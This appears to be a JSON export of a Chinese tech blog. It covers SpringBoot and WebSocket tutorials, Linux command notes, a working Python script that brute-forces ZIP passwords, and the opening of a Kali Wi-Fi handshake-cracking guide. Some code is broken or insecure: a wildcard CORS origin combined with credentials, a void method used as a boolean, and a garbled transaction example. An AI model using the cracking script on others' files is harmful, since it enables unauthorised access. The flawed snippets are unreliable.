Boot](https://spring.io/projects/spring-boot))\n\n## 快速入门\n\n### 案例\n\n①：继承父工程\n\n在pom.xml文件中添加以下配置，继承**spring-boot-starter-parent**这个父工程\n\n```xml\n<parent>\n\t<groupId>org.springframework.boot</groupId>\n\t<artifactId>spring-boot-starter-parent</artifactId>\n    <version>2.5.0</version>\n</parent>\n```\n\n②：添加依赖\n\n```xml\n<dependencies>\n\t<dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n</dependencies>\n```\n\n③：创建启动类\n\n创建main方法后在主类上添加**@SpringBootApplication**注释\n\n```java\n@SpringBootApplication\npublic class Application {\n    public static void main(String[] args){\n        SpringApplication.run(Application.class,args);\n    }\n}\n```\n\n### 打包运行\n\n①：添加Maven插件\n\n```xml\n    <build>\n        <plugins>\n            <!--springboot打包插件-->\n            <plugin>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-maven-plugin</artifactId>\n            </plugin>\n        </plugins>\n    </build>\n```\n\n②：点击IDEA右侧的**package**\n\n![点击](https://cdn.jsdelivr.net/gh/muouren7/PIC/img202211181528830.png)\n\n③：最后在cmd中输入**java -jar 打包好的文件.jar**运行\n\n## 起步依赖\n\nSpringBoot依靠父工程的版本锁定和starter机制简化对依赖的管理\n\n### 依赖冲突\n\n比如，A依赖C（低版本），B也依赖C（高版本）。都是同一个依赖而版本不同时会出现。\n\n### 解决方法\n\n排除低版本的依赖，留下高版本的依赖\n\n## 版本锁定\n\n在父工程中指定的版本号，尽可能避免依赖冲突\n\n## starter机制\n\n一个starter针对一种特定的场景，其内部引入了该场景所需的依赖。\n\n命名规律\n\n* 官方starter **sping-boot-starter-应用场景**，例如spring-boot-starter-data-jpg\n\n* 非官方starter **应用场景-spring-boot-starter** 例如mybatis-spring-boot-starter\n\n  \n\n## 读取YML配置\n\n### @Value注解\n\n此注解只能获取简单类型的值（8种基本数据类型及其包装类 ，String，Date）\n\n另外，加了@Value的类必须交给Spring容器管理\n\n```yaml\nstudent:\n\tlastName: muouren7\n```\n\n```java\n@Controller\npublic class Test {\n    @Value(\"${student.lastName}\")\n    private String name;\n\n    @RequestMapping(\"/\")\n    @ResponseBody\n    public String test(){\n        return name;\n    }\n}\n```\n\n### @ConfigurationProperties\n\n作用在对应的实体类上，且实体类要加上**@Component**注解\n\n使用时用**@Autowired**自动注入\n\nyml配置\n\n```yaml\nstudent:\n\tlastName: muouren7\n\tage: 17\n```\n\n实体类\t\n\n```java\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\n@Component\n@ConfigurationProperties(prefix = \"student\")\npublic class Student {\n    private String lastName;\n    private int age;\n}\n```\n\n控制类\n```java\n@Controller\npublic class Test {\n    @Autowired\n    private Student student;\n\n    @RequestMapping(\"/\")\n    @ResponseBody\n    public String test(){\n        return student.getLastName() + student.getAge();\n    }\n}\n```\n\n## 热部署\n\n在idea设置中打开自动构建\n\n![自动构建](https://cdn.jsdelivr.net/gh/muouren7/PIC/img202211191457799.png)\n\n设置运行程序运行期间自动启动\n\nctrl + shift + alt + / 这组快捷键后有一个小弹窗，点击Registry就会进入以下界面，找到以下配置勾选\n\n![设置](https://cdn.jsdelivr.net/gh/muouren7/PIC/img202211191504454.png)\n\n新版的在高级设置里\n\n![高级设置](https://cdn.jsdelivr.net/gh/muouren7/PIC/img202211191506497.png)\n\n\n\n### 使用\n\n①：添加依赖\n\n```xml\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-devtools</artifactId>\n            <optional>true</optional>\n        </dependency>\n```\n\n②：触发热部署\n\n当修改完代码或者静态资源后，可以切换到其他软件让IDEA自动编译，自动编译后就会触发热部署\n\n使用ctrl + F9手动出发重新编译\n\n# SpringBoot整合JUnit\n\n## 使用\n\n①：添加依赖\n\n```xml\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n        </dependency>\n```\n\n②：编写测试类\n\n```java\n@SpringBootTest(classes = Application.class)\npublic class StudentTest {\n    @Resource\n    private Student student;\n    \n    @Test\n    public void test(){\n        System.out.println(student);\n    }\n}\n```\n\n# 整合Mybatis\n\n## 步骤\n\n①：依赖\n\n```xml\n        <!--mybatis启动器-->\n        <dependency>\n            <groupId>org.mybatis.spring.boot</groupId>\n            <artifactId>mybatis-spring-boot-starter</artifactId>\n            <version>2.2.0</version>\n        </dependency>\n        <!--mysql驱动器-->\n        <dependency>\n            <groupId>mysql</groupId>\n            <artifactId>mysql-connector-java</artifactId>\n            <scope>runtime</scope>\n        </dependency>\n```\n\n②：配置数据库信息\n\n```yaml\nspring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/blogtest\n    usename: root\n    password: 123456\n    driver-class-name: com.mysql.cj.jdbc.Driver\n```\n\n③：配置mybatis相关配置\n\n```yaml\nmybatis:\n\tmapper-location: classpath:mapper/*Mapper.xml\t### mapper映射文件\n\ttype-aliases-package: com.xxxx.xxx\t\t\t### 配置哪个包下的类有默认的的别名\n```\n\n④：编写Mapper接口\n\n注意在接口处加上@Mapper和@Repository\n\n```java\n@Repository\n@Mapper\npublic interface UserMapper{\n    public List<User> findAll();\n}\n```\n\n# Web开发\n\n## 静态资源的存放与访问\n\n​\t静态资源可以存放到 **resources/static** （或者 **resources/public** 或者 **resources/resources** 或者 **resources/META-INF/resources**）中即可。\n\n​\t例如要访问文件：resources/static/index.html 只需要在访问时资源路径写成/index.html即可\n\n​\t示例：访问文件：resources/static/pages/login.html ，访问资源路径写成/pages/login.html\n\n### 修改静态资源访问路径\n\nSpringBoot的默认静态资源路径匹配为/**  （表示当前路径）。可以通过修改 spring.mvc.static-path-pattern 这个配置进行修改。\n\n例如：想在访问的路径前加上/res，比如/res/index.html才能访问到static目录中，我们可以修改如下\n\napplication.yml\n\n```yaml\nspring:\n  mvc:\n    static-path-pattern: /res/**\n```\n\n### 修改静态资源的存放目录\n\n示例：此时静态资源目录不再是/static目录，而是resources目录下的Img目录\n\n```yaml\nspring:\n  web:\n    resources:\n      static-locations: classpath:/Img/\n```\n\n配置多个静态资源目录\n\n```yaml\nspring:\n  web:\n    resources:\n      static-locations:\n      - classpath:/Img/\n      - classpath:/static/\n```\n\n## 获取路径参数\n\n请求url：/test/1\n\n```java\n@Controller\npublic class Test {\n    @RequestMapping(\"/test/{id}\")\n    @ResponseBody\n    public String test(@PathVariable(\"id\") Integer id){\n        return id.toString();\n    }\n}\n```\n\n## 获取请求体json参数\n\n导入依赖，SpringBoot启动器中默认已导入，在控制器参数上加上@RequestBody注解\n\n```xml\n        <!--json转换-->\n        <dependency>\n            <groupId>com.fasterxml.jackson.core</groupId>\n            <artifactId>jackson-databind</artifactId>\n            <version>2.9.0</version>\n        </dependency>\n```\n\n```java\n@Controller\npublic class Test {\n\n    @RequestMapping(\"/test/{id}\")\n    @ResponseBody\n    public String test(@RequestBody Student student){\n        return student.toString();\n    }\n}\n```\n\n## 获取QueryString格式参数\n\n参数格式：url? key1=value1 && key2=value2\n\n示例：url：**http://127.0.0.1:8080/test?lastName=muouren7&age=18**\n\n①：使用@RequestParam注解\n\n```java\n@Controller\npublic class Test {\n\n    @RequestMapping(\"/test\")\n    @ResponseBody\n    public String test(@RequestParam String lastName, @RequestParam Integer age){ //@RequestParam注解可加可不加\n        return lastName + age;\n    }\n}\n```\n\n②：使用@Validated参数\n\n```java\n@Controller\n@CrossOrigin\npublic class Test {\n\n    @RequestMapping(\"/test\")\n    @ResponseBody\n    public RestRult test(@Validated Student student){\n        RestRult<Student> restRult = new RestRult<>(200,\"aaa\",student);\n        return restRult;\n    }\n}\n```\n\n\n\n## 响应体响应数据\n\n### 数据放到响应体\n\n导入依赖，SpringBoot启动器中默认已导入\n\n```xml\n        <!--json转换-->\n        <dependency>\n            <groupId>com.fasterxml.jackson.core</groupId>\n            <artifactId>jackson-databind</artifactId>\n            <version>2.9.0</version>\n        </dependency>\n```\n\n使用@ResponseBody注解，将数据放入响应体并转换为json\n\n```java\n@Controller\npublic class Test {\n\n    @RequestMapping(\"/test\")\n    @ResponseBody\n    public Student test(@RequestParam String lastName, @RequestParam Integer age){\n        return new Student(lastName,age);\n        //return student.getLastName() + student.getAge();\n    }\n}\n```\n\n### 统一响应内容格式\n\n返回类\n\n```java\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\n@JsonInclude(JsonInclude.Include.NON_NULL)\t//当某个属性为null时，则在序列化时过滤掉\npublic class RestRult<T> {\n    private Integer code;\n    private String msg;\n    private T data;\n}\n```\n\n\n\n## 跨域\n\n### ①：使用@CrossOrigin\n\n该注解可以加在控制器方法或类上\n\n```java\n@Controller\n@CrossOrigin\t\t//在类上表示当前类所有方法均可跨域\npublic class Test {\n\n    @RequestMapping(\"/test\")\n    @ResponseBody\n    public RestRult test(@RequestParam String lastName, @RequestParam Integer age){\n        System.out.println(lastName+age);\n        RestRult<Student> restRult = new RestRult<>(200,\"aaa\",new Student(lastName,age));\n        return restRult;\n    }\n}\n```\n\n\n\n\n\n### ②：使用WebMvcConfigurer的addCorsMappings方法配置CorsInterceptor\n\n当跨域允许携带cookie时，域名就不能为 *\n\n```java\n@Configuration\npublic class config {\n    @Bean\n    public WebMvcConfigurer configurer(){\n        return new WebMvcConfigurer() {\n            @Override\n            public void addCorsMappings(CorsRegistry corsRegistry){\n                corsRegistry.addMapping(\"/api/**\");\t\t//可以通过的域名地址\n            }\n        };\n    }\n}\n```\n\n```java\n@Configuration\npublic class config implements WebMvcConfigurer {\n\n    @Override\n    public void addCorsMappings(CorsRegistry registry){\n            //设置允许跨域的路径（哪些接口）\n        registry.addMapping(\"/**\")\n                //设置允许跨域请求的域名\n                .allowedOrigins(\"*\")\n                //是否允许带cookie\n                .allowCredentials(true)\n                //允许的请求方式\n                .allowedMethods(\"GET\",\"POST\",\"DELETE\",\"PUT\")\n                //允许的请求头\n                .allowedHeaders(\"*\")\n                //跨域允许时间\n                .maxAge(3600);\n    }\n}\n```\n\n## Token生成\n\n[jjwt开源地址]([jwtk/jjwt： Java JWT： JSON Web Token for Java and Android (github.com)](https://github.com/jwtk/jjwt#quickstart))\n\n导入依赖\n\n```xml\n<dependency>\n    <groupId>io.jsonwebtoken</groupId>\n    <artifactId>jjwt-api</artifactId>\n    <version>0.11.5</version>\n</dependency>\n<dependency>\n    <groupId>io.jsonwebtoken</groupId>\n    <artifactId>jjwt-impl</artifactId>\n    <version>0.11.5</version>\n    <scope>runtime</scope>\n</dependency>\n<dependency>\n    <groupId>io.jsonwebtoken</groupId>\n    <artifactId>jjwt-jackson</artifactId> <!-- or jjwt-gson if Gson is preferred -->\n    <version>0.11.5</version>\n    <scope>runtime</scope>\n</dependency>\n```\n\n工具类\n\n```java\n@Component\npublic class Token {\n    Key key = Keys.secretKeyFor(SignatureAlgorithm.HS256);\n\n    public String createToken(String subject){\n\n        String jws = Jwts.builder().setSubject(subject).signWith(key).setExpiration(new Date(new Date().getTime() + 5000)).compact();\n        return jws;\n    }\n\n    public void varity(String jws){\n        try {\n            String subject = Jwts.parserBuilder().setSigningKey(key).build().parseClaimsJws(jws).getBody().getSubject();\n            System.out.println(\"验证通过\");\n            System.out.println(subject);\n        }catch (JwtException e){\n            System.out.println(\"验证失败\");\n        }\n    }\n}\n```\n\n测试类\n\n```java\n@SpringBootTest\npublic class TokenTest {\n\n    @Autowired\n    Token tk;\n\n    @Test\n    public void test() throws InterruptedException {\n        String token = tk.createToken(\"AAA\");\n        System.out.println(token);\n        System.out.println(\"---------------\");\n        Thread.sleep(5000);\n        tk.varity(token);\n    }\n\n}\n```\n\n## 拦截器\n\n### 拦截器与过滤器的区别\n\n​\t①、拦截器(Interceptor)只对action请求起作用 即对外访问路径而过滤器(Filter)则可以对几乎所有的请求都能起作用 包括css js等资源文件\n​\t②、拦截器(Interceptor)是在Servlet和Controller控制器之间执行而过滤器(Filter)是在请求进入Tomcat容器之后 但是在请求进入Servlet之前执行\n\n### 创建并配置拦截器\n\n①：创建类并实现接口\n\n```java\nimport org.springframework.web.servlet.HandlerInterceptor;\n\npublic class MyInterceptor implements HandlerInterceptor {\n}\n```\n\n②：实现方法\n\n```java\n@Component\npublic class MyInterceptor implements HandlerInterceptor {\n\n    @Autowired\n    private Token token;\n\n    //在handler方法执行之前会被调用，验证header里面的token\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        String tk = request.getHeader(\"Token\");\n        if(token.varity(tk)){\n            return true;\n        }else {\n            return false;\n        }\n    }\n\n    //执行后调用\n    @Override\n    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception{\n        System.out.println(\"postHandle\");\n    }\n\n    //最终再调用\n    @Override\n    public void afterCompletion(HttpServletRequest request,HttpServletResponse response,Object handler,Exception ex) throws Exception{\n        System.out.println(\"afterCompletion\");\n    }\n}\n```\n\n③：配置拦截器\n\n```java\n@Configuration\npublic class config implements WebMvcConfigurer {\n    @Autowired\n    private MyInterceptor myInterceptor;\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        registry.addInterceptor(myInterceptor)  //添加拦截器对象\n                .addPathPatterns(\"/**\") //对任意路径拦截\n                .excludePathPatterns(\"/login\"); //配置排除路径\n    }\n}\n```\n\n## 自定义参数解析（暂无）\n\n​\t\t如果我们想实现像获取请求体中的数据那样，在Handler方法的参数上增加一个@ResponseBody注解就可以获取到对应的数据的话。\n​\t\t可以使用HandlerMethodArgumentResolver来实现自定义的参数解析。\n\n## SpringBoot声明式事务\n\n直接在需要事务控制的方法上加上对应的注解**@Transactional**\n\n```java\n@service\npublic class UserserviceImp1 imp1ements Userservcie {\n    @Autowired\n    private userMapper userMapper;\n    @Override\n    pub1ic List<user> findAll(){\n    \treturn userMapper.findA77();\n    }\n    @Override\n    @Transactional\n    public void insertUser(\n        //添加2个用户到数据库\n        user user = new user(nu11 , \"sg666\",15 ,\"上海\");\n        user user2 = new user(nu11 , \"sg777\" ,16,\"北京\");\n        userMapper.insertuser(user)\n        System. out.print1n(1/0);\n        userMapper.insertUser(user2);\n    }\n}\n\n```\n\n### 切换动态代理\n\n在配置文件中添加以下配置，**true**代表Cglib，**false**代表jdk代理\n\n```yaml\n  spring:\n      aop:\n        proxy-target-class: false #切换动态代理方式\n```\n\n## AOP\n\n### 使用\n\n添加依赖\n\n```xml\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-aop</artifactId>\n        </dependency>\n```\n\n## 日志\n\n开启日志\n\n```yaml\ndebug: true #开启日志\nlogging:\n\tlevel:\n\t\tcom.xxxx: debug #设置包下的日志级别\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["SpringBoot"]},{"title":"SpringBoot-WebSocket编程","url":"/2025/01/12/SpringBoot-WebSocket编程/","content":"\n## 后端\n\n### 1、在SpringBoot的pom.xml文件里添加依赖:\n\n```xml\n<!-- websocket -->\n<dependency>\n   <groupId>org.springframework.boot</groupId>\n   <artifactId>spring-boot-starter-websocket</artifactId>\n</dependency>\n\n```\n\n### 2、在配置中加入 WebSocketConfig.java\n\n```java\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.socket.server.standard.ServerEndpointExporter;\n\n@Configuration\npublic class WebSocketConfig {\n\n    /**\n     * 注入一个ServerEndpointExporter,该Bean会自动注册使用@ServerEndpoint注解申明的websocket endpoint\n     */\n    @Bean\n    public ServerEndpointExporter serverEndpointExporter() {\n        return new ServerEndpointExporter();\n    }\n\n}\n```\n\n### 3、新建component文件夹，加入WebSocketServer.java\n\n```java\n@ServerEndpoint(value = \"/chat/{username}\")\n@Component\npublic class WebSocketService {\n\n\n    /**\n     * 记录当前在线连接数\n     */\n    public static final Map<String, Session> sessionMap = new HashMap<>();\n\n    /**\n     * 连接建立成功调用的方法\n     */\n    @OnOpen\n    public void onOpen(Session session, @PathParam(\"username\") String username) {\n        Message M = new Message();\n        sessionMap.put(username, session);\n        M.setUsername(username);\n        M.setMessage(\"----加入到了聊天室\");\n        String message = JSONObject.fromObject(M).toString();\n        System.out.println(username+\"已经加入\");\n        System.out.println(message);\n        sendAllMessage(message);\n    }\n\n    /**\n     * 连接关闭调用的方法\n     */\n    @OnClose\n    public void onClose(Session session, @PathParam(\"username\") String username) {\n        sessionMap.remove(username);\n        System.out.println(username+\"已经退出\");\n\n    }\n\n    /**\n     * 收到客户端消息后调用的方法\n     * 后台收到客户端发送过来的消息\n     * onMessage 是一个消息的中转站\n     * 接受 浏览器端 socket.send 发送过来的 json数据\n     * @param message 客户端发送过来的消息\n     */\n    @OnMessage\n    public void onMessage(String message, Session session, @PathParam(\"username\") String username) {\n        Message MM = new Message();\n        MM.setUsername(username);\n        MM.setMessage(message);\n        String sendmsg = JSONObject.fromObject(MM).toString();\n        System.out.println(\"服务器发送数据\"+sendmsg);\n\n        sendAllMessage(sendmsg);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    /**\n     * 服务端发送消息给客户端\n     */\n    private void sendMessage(String message, Session toSession) {\n        try {\n            toSession.getBasicRemote().sendText(message);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    /**\n     * 服务端发送消息给所有客户端\n     */\n    private void sendAllMessage(String message) {\n        try {\n            for (Session session : sessionMap.values()) {\n                //System.out.println(\"服务器发送数据给\"+session.getId());\n                session.getBasicRemote().sendText(message);\n            }\n        } catch (Exception e) {\n           e.printStackTrace();\n        }\n    }\n\n}\n\n```\n\n### 4、对接口进行放行\n\n```java\n@Configuration\npublic class WebConfig implements WebMvcConfigurer {\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        registry.addInterceptor(new WebContentInterceptor())\n                .excludePathPatterns(\"/chat/**\");\n    }\n}\n```\n\n\n\n## 前端\n\n### Index.vue\n\n```vue\n<template>\n    <el-input v-model=\"username\" placeholder=\"请输入名字\" />\n    <el-button type=\"primary\" v-on:click=\"conf\">确认</el-button>\n</template>\n\n<script>\nexport default {\n    name:\"inDex\",\n    data(){\n    return{\n      username: \"\"\n    }\n  },\n  methods: {\n    conf(){\n        if(this.username == \"\"){\n          alert(\"用户名不能为空\")\n        }else{\n          localStorage.setItem('username',this.username);\n          alert(\"宁当前的用户名是\"+localStorage.getItem(\"username\"))\n          this.$router.push(\"/chat\")\n        }\n    }\n  }\n}\n</script>\n\n<style>\n\n</style>\n```\n\n\n\n### Chat.vue\n\n```vue\n<template>\n    <el-scrollbar height=\"400px\">\n        <el-input v-model=\"this.data.mysay\" placeholder=\"请输入\" />\n        <el-button type=\"primary\" v-on:click=\"send\">发送</el-button>\n        <p v-for=\"item in this.data.message\" :key=\"item\">{{ item }}</p>\n    </el-scrollbar>\n</template>\n\n<script>\nvar sc\nexport default {\n    name:\"chAt\",\n    data(){\n        return {\n            data:{\n                username:\"\",\n                message:[],\n                mysay:\"\"\n            }\n        }\n    },\n    mounted(){\n        let that = this\n        if(typeof(WebSocket) == \"undefined\"){\n            alert(\"您的浏览器不支持WebSocket，无法使用该聊天功能\")\n        }else{\n            if(localStorage.getItem(\"username\") == \"undefined\" || localStorage.getItem(\"username\") == null){\n                alert(\"您还未输入用户名\")\n            }else{\n                sc = new WebSocket(\"ws://43.153.105.80:80/chat/\"+localStorage.getItem(\"username\"))\n                sc.onopen = ()=>{\n                    that.data.message.push(\"您当前已经加入会话\")\n                }\n                sc.onclose = ()=>{\n                    that.data.message.push(\"您已经推出聊天\")\n                }\n                sc.onmessage = (m)=>{\n                    let mm = JSON.parse(m.data)\n                    //console.log(m.data)\n                    that.data.message.push(mm[\"username\"]+\"说：\"+mm[\"message\"])\n                }\n            }\n            \n        }\n    },\n    methods:{\n        send(){\n            //alert(this.data.mysay)\n            sc.send(this.data.mysay)\n        }\n    }\n}\n</script>\n<style>\n\n</style>\n```\n\nps：vue项目在打包为静态页面时，需要在**vue.config.js**中添加以下代码，否则会出现打包后一片空白的场景\n\n**publicPath: './',**\n\n```javascript\nconst { defineConfig } = require('@vue/cli-service')\nmodule.exports = defineConfig({\n  publicPath: './',\n  transpileDependencies: true\n})\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["SpringBoot","WebSocket"]},{"title":"python爆破zip文件密码","url":"/2025/01/12/python爆破zip文件密码/","content":"\n# 准备\n\n## 环境\n\npython 版本 3.11.0\n\n第三方库：zipfile\n\n安装:\n\n```shell\npip install zipfile36\n```\n\n## 密码生成\n\n这里的word表示密码只有数字\n\n可以在后面加入大小写字母或其他字符以进行遍历\n\n```python\nimport itertools\n\nwords = \"0123456789\"\n### 生成指定长度的密码集合\ndef CreatePwd(length):\n    r = itertools.product(words,repeat=length)\n    return r\n```\n\n## 文件读取\n\n*zip文件与python代码保存在同一级目录下\n\n```python\nimport zipfile\n\ndef uncompress(filename,password):\n    try:\n        with zipfile.ZipFile(filename) as z:\n            z.extractall(\"./\",pwd=password.encode('utf-8'))\n            z.close()\n            print(\"成功\")\n        return True\n    except BaseException as e:\n        #print(str(e))\n        return False\n```\n\n## 主逻辑\n\n这里的**5**，**7**表示密码的长度只在五位与六位数中进行爆破，可以改为其他长度范围\n\n```python\nfor i in range(5,7):\n    r = CreatePwd(i)\n    jishuqi = 0\n    for j in r:\n        if jishuqi == 500:\n            os.system(\"cls\")\n            jishuqi = 0\n            #time.sleep(5)\n        jishuqi = jishuqi + 1\n        if not uncompress(\"test.zip\",\"\".join(j)):\n            print(\"密码不是：\"+\"\".join(j))\n        else:\n            print(\"密码是：\"+\"\".join(j))\n            exit(0)\n```\n\n## 完整代码\n\n```python\nimport zipfile\nimport itertools\nimport os\n\nwords = \"0123456789\"\n\n\n\n### 生成指定长度的密码集合\ndef CreatePwd(length):\n    r = itertools.product(words,repeat=length)\n    return r\n\ndef uncompress(filename,password):\n    try:\n        with zipfile.ZipFile(filename) as z:\n            z.extractall(\"./\",pwd=password.encode('utf-8'))\n            z.close()\n            print(\"成功\")\n        return True\n    except BaseException as e:\n        #print(str(e))\n        return False\n\nfor i in range(5,7):\n    r = CreatePwd(i)\n    jishuqi = 0\n    for j in r:\n        if jishuqi == 500:\n            os.system(\"cls\")\n            jishuqi = 0\n            #time.sleep(5)\n        jishuqi = jishuqi + 1\n        if not uncompress(\"test.zip\",\"\".join(j)):\n            print(\"密码不是：\"+\"\".join(j))\n        else:\n            print(\"密码是：\"+\"\".join(j))\n            exit(0)\n\n```\n\n## 测试\n\n这里设置zip文件的密码为64887\n\n![密码](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202301282235627.png)\n\n将密码的范围设置为4-8(实际上代码执行时的密码范围是4-7)\n\n![修改代码](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202301282237280.png)\n\n然后执行，时间长度按密码的长度增加而增加，即代码中word的字符越多，穷举的时间呈指数上升。\n\n**可以根据猜测在word变量中添加密码可能存在的字符**\n\n![执行结果](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202301292207558.png)\n\n","tags":["python","zip","爆破"]},{"title":"Pandro本地搭建chatgpt","url":"/2025/01/12/Pandro本地搭建chatgpt/","content":"\n\n\n1、下载并安装Docker [Docker官网](https://www.docker.com)\n\n2、使用潘多拉 (Pandora) [pengzhile/pandora](https://github.com/pengzhile/pandora)\n\n```shell\ndocker pull pengzhile/pandora\n```\n\n```shell\ndocker run  -e PANDORA_CLOUD=cloud -e PANDORA_SERVER=0.0.0.0:8899 -p 8899:8899 -d pengzhile/pandora\n```\n\n","tags":["教程"]},{"title":"Linux常用命令","url":"/2025/01/12/Linux（快记）/","content":"\n\n\n# Linux（快记）\n\n## 1、文件管理\n\n### 1.1、Linux目录\n\n| 目录  | 作用                                        |\n| ----- | ------------------------------------------- |\n| /boot | 系统启动相关文件，如内核 、initrd，以及grub |\n| /dev  | 设备                                        |\n\ntouch 创建空白文件\n\nmkdir 创建目录 -p 表示递归创建\n\nrm 删除文件 -r 删除目录（递归） -f 强制\n\n### 1.2、文件权限\n\n**ls -la** ：\n\n| 权限项   | 文件类型      | 读   | 写         | 执行 | 读   | 写             | 执行 | 读   | 写       | 执行 |\n| -------- | ------------- | ---- | ---------- | ---- | ---- | -------------- | ---- | ---- | -------- | ---- |\n| 字符表示 | d、l、c、s、p | r    | w          | x    | r    | w              | x    | r    | w        | x    |\n| 数字表示 |               | 4    | 2          | 1    | 4    | 2              | 1    | 4    | 2        | 1    |\n| 权限分配 |               |      | 文件所有者 |      |      | 文件所属组用户 |      |      | 其他用户 |      |\n\n​\t\t\td:文件夹\tl:链接文件\tc:字符文件（如键盘）\tb:块文件如磁盘分区\n\n **chmod**：改变权限\n\nchmod -r 递归修改权限\n\n| chmod | u (所有者)<br />g （组）<br />o （其他人）<br />a （全部） | +(加入)<br />-(除去)<br />=(设定) | r<br />w<br />x | 文件或目录 |\n| ----- | ---------------------------------------------------------- | --------------------------------- | --------------- | ---------- |\n|       |                                                            |                                   |                 |            |\n\n**容易犯错 chmod -r 777 /**\n\n**chown**：改变文件拥有者或所属群组\n\nchown -r 账号名称 文件或目录\n\nchown hik test 修改test文件所有者为hik\n\nchown -r 账号名称 :组名 文件或目录\n\nchown root:hik test\n\n修改test文件所有者为root，群组为hik\n\n### 1.3 所有文件被赋予777故障恢复\n\n\n\n### 1.4 文件与目录的见识\n\nls -la 查看当前目录下文的详细信息\n\ndu -sh 查看指定目录下文件的详细信息大小\n\n### 1.5 复制\\移动\n\ncp -r /源目录 /目标目录\n\nmv /源目录 /目标目录\n\n远程拷贝\n\nscp -p (sshd服务端口) -r （递归）\n\nscp -p 5555 -r hik@192.168.154.4:/home  /home\n\n### 1.5打包压缩\n\n| 打包\\压缩文件                           | 解包\\解压文件                   |\n| --------------------------------------- | ------------------------------- |\n| tar -cvf xxx.tar /home 打包压缩         | tar -xvf xx.tar 解包文件        |\n| tar -zcvf xx.tar.gz /home  打包并压缩   | tar -zxvf xx.tar.gz  解包并解压 |\n| zip -r xx.zip /home  压缩文件 (zip格式) | unzip xx.zip 解压               |\n|                                         |                                 |\n\n### 1.6 文件修改 vim\n\nvim xx.txt\n\n进入后是编辑模式\n\n按i进入输入模式\n\n按esc退出至末行模式\n\n| 编辑模式                                                     | 输入模式                                                     | 末行模式                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| 移动光标<br />yy复制光标所在行<br />p 粘贴至光标处<br />dd 删除光标所在行 | i:insert 在光标处输入<br />v:visual，移动光标选择，配合y复制 | :wq 保存，退出<br />/test 往末尾查到test字符<br />? test 往前查找test字符 |\n\n### 1.7文件查找\n\nfind 指定目录下 -name 文件名称\n\n| 参数                                             | 作用                                                         |\n| ------------------------------------------------ | ------------------------------------------------------------ |\n| -name                                            | 匹配名称                                                     |\n| -user<br />-group                                | 匹配所有者<br />匹配组                                       |\n| -size                                            | 文件大小 +50kb 超过50kb的文件   -50kb 小于50kb的文件         |\n| -mtime -n +n<br />-atime -n +n<br />-ctime -n +n | 匹配修改内容的时间<br />匹配访问文件的时间<br />匹配修改文件权限的时间<br />-n指n天以内  +n指n天以前 |\n| -exec ......{}\\;                                 | find的结果交给后边的命令处理                                 |\n| \\|xagrs -i ......{}                              | 同上                                                         |\n\nfind /var -size -10M -size +1M -exec du -sh ()\\;\n\n查找/var目录下1m到10m大小的文件，并用于du -sh处理\n\nfind /var/ -mtime +10 -name \"*.log\" |xargs -i cp {} /tmp\n\n将查找/var/目录小修改时间超过10天的文件复制到 /tmp目录下\n\n### 1.8 其余\n\necho \"xxxx\" > test （覆盖）\n\necho \"xxxx\" >> test （追加）\n\nchattr 修改隐藏属性  lsattr 查看文件隐藏权限\n\n### 1.9 常见问题\n\n权限问题导致文件无法下载\n\nchmod o+r 登陆用户\n\n隐藏权限导致文件无法修改lsattr查看\n\nchattr +i 文件名 加锁定 -i去锁定\n\nlsof | grep deleted 确认已经删除文件但未释放空间\n\n## 2、磁盘管理\n\n### 2.1 RAID管理\n\n\n\n### 2.2 分区管理\n\n\n\n### 2.3 逻辑卷配置管理\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["Linux"]},{"title":"KaliLinux捕获wifi握手包，EWAS爆破wifi密码","url":"/2025/01/12/KaliLinux捕获wifi握手包，EWAS爆破wifi密码/","content":"\n## 前言\n\n这种方式仅是了解相关知识，没有太大的实操意义\n\n## 准备\n\n* Kali Linux (直接下载虚拟机版) [Get Kali | Kali Linux](https://www.kali.org/get-kali/#kali-virtual-machines)\n* VMWare\n* 支持嗅探的无线网卡\n\n## 原理\n\n在目标wifi进行连接时，会与建立连接的手机之间发送握手包，其原理就是通过握手包里的偏移量反穷举出wifi密码 （要不咋说是爆破呢）具体协议可通过wireshark捕获后查看（还没搞懂整个wpa2-psk相关的具体协议）\n\n## Kali Linux重置密码\n\n2023新版的kali 默认账户密码是 **kali/kali**\n\n先以 kali/kali 普通用户的身份登录\n\n然后切换 root 用户\n\n```shell\nsudo su\n```\n\nroot密码也是 **kali**\n\n然后更换root账户密码\n\n```bash\npsswd root\n```\n\n## 设置中文\n\n在root账户下执行以下命令\n\n```shell\ndpkg-reconfigure locales\n```\n找到**en_US.UTF-8 UTF-8**选项，按空格键将其进行取消\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306241323962.png)\n\n选择语言**zh_CN.UTF-8 